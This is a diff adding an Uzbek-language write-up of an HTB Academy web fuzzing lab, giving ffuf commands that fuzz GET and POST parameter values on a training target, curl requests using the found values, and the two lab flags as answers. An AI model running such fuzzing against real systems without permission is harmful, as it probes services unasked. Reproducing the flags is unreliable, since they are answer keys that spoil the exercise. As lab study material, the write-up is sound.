@@ -1,6 +1,39 @@
 # CTF yechimlari (targetlar)
 
+## Target 14 — GET/POST parameter fuzzing (HTB Academy "Web Fuzzing")
+
+Target: `http://154.57.164.71:40811` (lighttpd + PHP 8.3.9; 404 = 158 bayt).
+
+| Savol | Javob |
+|-------|-------|
+| GET parametrini fuzz qilganda topilgan flag | **`HTB{g3t_fuzz1ng_succ3ss}`** |
+| POST parametrini fuzz qilganda topilgan flag | **`HTB{p0st_fuzz1ng_succ3ss}`** |
+
+Fayl fuzzing natijasida `get.php` va `post.php` topiladi; ikkalasi ham noto'g'ri
+qiymatda `Incorrect parameter value` qaytaradi (`x: <qiymat>` / `y: <qiymat>`),
+ya'ni parametr nomlari mos ravishda `x` (GET) va `y` (POST).
+
+```bash
+# GET  : ?x=<qiymat>
+ffuf -w common.txt -u http://IP:PORT/get.php?x=FUZZ -fs 30
+# POST : y=<qiymat>
+ffuf -w common.txt -u http://IP:PORT/post.php -X POST -d 'y=FUZZ' -fs 30
+```
+
+`common.txt` ichidagi mos qiymatlar: `x=OA_HTML`, `y=SUNWmc` →
+```
+$ curl -s -G --data-urlencode 'x=OA_HTML' http://154.57.164.71:40811/get.php
+HTB{g3t_fuzz1ng_succ3ss}
+$ curl -s -X POST --data-urlencode 'y=SUNWmc' http://154.57.164.71:40811/post.php
+HTB{p0st_fuzz1ng_succ3ss}
+```
+
+Tekshirish: `bash solutions/fuzz_params.sh`
+
+---
+
 ## Target 13 — Recursive fuzzing (HTB Academy "Web Fuzzing")
+
 
 Target: `http://154.57.164.76:37377/recursive_fuzz/` (lighttpd, 404 = 158 bayt).
 
